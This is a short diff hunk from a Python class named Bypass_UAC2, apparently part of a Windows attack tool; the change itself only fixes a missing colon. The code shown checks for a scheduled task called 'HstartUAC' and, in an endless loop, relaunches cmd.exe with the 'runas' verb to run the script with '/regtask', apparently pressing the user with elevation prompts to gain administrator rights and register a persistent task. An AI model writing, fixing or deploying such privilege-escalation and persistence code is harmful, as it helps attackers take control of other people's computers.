@@ -22,7 +22,7 @@ class Bypass_UAC2():
 		python = os.path.abspath(sys.executable)
 		me = os.path.abspath(sys.argv[0])
 
-		if "HstartUAC" not in os.popen('schtasks.exe | findstr HstartUAC').read()
+		if "HstartUAC" not in os.popen('schtasks.exe | findstr HstartUAC').read():
 			while True:
 				try:
 					shell.ShellExecuteEx(lpVerb='runas', lpFile="cmd.exe", lpParameters="/c " + filename + " /regtask")
